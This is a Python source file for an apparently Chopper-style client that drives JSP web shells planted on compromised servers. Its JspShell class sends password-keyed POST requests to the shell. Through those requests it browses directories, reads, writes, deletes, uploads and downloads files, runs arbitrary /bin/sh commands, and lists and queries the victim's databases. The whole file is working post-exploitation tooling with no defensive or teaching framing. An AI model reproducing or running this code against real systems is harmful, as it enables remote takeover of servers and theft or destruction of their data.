# coding=utf-8

"""
@version: 1.0
@author: chaowei
@file: shell.py
@time: 2018/2/18 16:52
"""
import requests
import config

import sys,thread

sys.path.append("..")

from entity import *
from dbHelper import DatabaseHelper
from commonsUtil import ThreadWithReturnValue
from logger import log

class ShellTools:

    def __init__(self):
        pass

    @staticmethod
    def getShellTools(shellEntity):
        if shellEntity.shell_script_type=='JSP':
            return JspShell(shellEntity)

class JspShell:

    def __init__(self,shellEntity):
        self.shellEntity=shellEntity
        self.httpSettingEntity=DatabaseHelper.getHttpSettingEntityByShellID(shellEntity.shell_id)
        if not self.httpSettingEntity:
            self.httpSettingEntity=HttpSettingEntity(config.HTTP_DEFAULT_COOKIE,config.HTTP_DEFAULT_UA)
        self.httpHeaders={'User-Agent': self.httpSettingEntity.user_agent,'Cookie':self.httpSettingEntity.cookie}

    def parseResponse(self,response):
        responseText=response.text
        if config.SPLIT_SYMBOL_LEFT in responseText and config.SPLIT_SYMBOL_RIGHT in responseText:
            resultText=responseText[responseText.find(config.SPLIT_SYMBOL_LEFT)+len(config.SPLIT_SYMBOL_LEFT):responseText.find(config.SPLIT_SYMBOL_RIGHT)]
            if config.ERROR_LABEL in resultText:
                return config.ERROR_RESPONSE_WITH_SYMBOL,resultText
            return config.REQUESTS_SUCCESS,resultText
        else:
            return config.ERROR_RESPONSE_NO_SYMBOL,response.status_code

    def __getStart(self):
        payload = {self.shellEntity.shell_password: 'A','z0':self.shellEntity.shell_encode_type}
        return requests.post(self.shellEntity.shell_address,headers=self.httpHeaders,data=payload)

    def getStart(self):
        try:

            thread=ThreadWithReturnValue(self.__getStart)
            thread.start()
            return self.parseResponse(thread.join())

        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __getDirectoryContent(self,path):
        payload = {self.shellEntity.shell_password: 'B','z1':path,'z0':self.shellEntity.shell_encode_type}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def getDirectoryContent(self, path):
        try:
            thread = ThreadWithReturnValue(self.__getDirectoryContent,(path,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __getFileContent(self,path):
        payload = {self.shellEntity.shell_password: 'C', 'z1': path,'z0':self.shellEntity.shell_encode_type}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def getFileContent(self,path):
        try:
            thread = ThreadWithReturnValue(self.__getFileContent, (path,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __createFile(self,path,content):
        payload = {self.shellEntity.shell_password: 'D', 'z1': path, 'z0': self.shellEntity.shell_encode_type,'z2':content}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def createFile(self,path,content):
        try:
            thread = ThreadWithReturnValue(self.__createFile, (path,content,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __deleteFileOrDirectory(self,path):
        payload = {self.shellEntity.shell_password: 'E', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def deleteFileOrDirectory(self,path):
        try:
            thread = ThreadWithReturnValue(self.__deleteFileOrDirectory, (path,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def downloadFile(self,path):
        chunk_size = 1024
        payload = {self.shellEntity.shell_password: 'F', 'z1': path, 'z0': self.shellEntity.shell_encode_type}
        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload,stream=True)
        if response.status_code==200:
            for data in response.iter_content(chunk_size=chunk_size):
                yield data
        else:
            yield self.parseResponse(response)

    def __uploadFile(self,path,hexString):
        chunk_size = 1024
        payload = {self.shellEntity.shell_password: 'G', 'z1': path, 'z0': self.shellEntity.shell_encode_type,'z2':hexString}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def uploadFile(self,path,hexString):
        try:
            thread = ThreadWithReturnValue(self.__uploadFile, (path,hexString,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __excuteCommand(self,path,command):
        z2='{0};{1};echo [S];pwd;echo [E]'.format(path,command)
        payload = {self.shellEntity.shell_password: 'M', 'z1': '-c/bin/sh','z2':z2, 'z0': self.shellEntity.shell_encode_type}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def excuteCommand(self,path,command):
        try:
            thread = ThreadWithReturnValue(self.__excuteCommand, (path,command,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __getDatabases(self,connectInfo):
        payload = {self.shellEntity.shell_password: 'N', 'z1': connectInfo.replace('\n','\r\n'), 'z0': self.shellEntity.shell_encode_type,'z2':''}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def getDatabases(self,connectInfo):
        try:
            thread = ThreadWithReturnValue(self.__getDatabases, (connectInfo,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __getTables(self,connectInfo,databaseName):
        payload = {self.shellEntity.shell_password: 'O', 'z1': connectInfo.replace('\n','\r\n')+'\r\n'+databaseName, 'z0': self.shellEntity.shell_encode_type,'z2':''}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def getTables(self,connectInfo,databaseName):
        try:
            thread = ThreadWithReturnValue(self.__getTables, (connectInfo,databaseName,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __getColumns(self,connectInfo,databaseName,tableName):
        payload = {self.shellEntity.shell_password: 'P', 'z1': connectInfo.replace('\n','\r\n') + '\r\n' + databaseName+'\r\n'+tableName,
                   'z0': self.shellEntity.shell_encode_type,'z2':''}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def getColumns(self,connectInfo,databaseName,tableName):
        try:
            thread = ThreadWithReturnValue(self.__getColumns, (connectInfo, databaseName,tableName,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)

    def __excuteSqlQuery(self,connectInfo,databaseName,sqlStr):
        payload = {self.shellEntity.shell_password: 'Q', 'z1': connectInfo.replace('\n','\r\n') + '\r\n' + databaseName ,'z2':sqlStr,
                   'z0': self.shellEntity.shell_encode_type}
        return requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)

    def excuteSqlQuery(self,connectInfo,databaseName,sqlStr):
        try:
            thread = ThreadWithReturnValue(self.__excuteSqlQuery, (connectInfo, databaseName, sqlStr,))
            thread.start()
            return self.parseResponse(thread.join())
        except Exception as e:
            log.e(str(e))
            return config.ERROR_DAFANG,str(e)
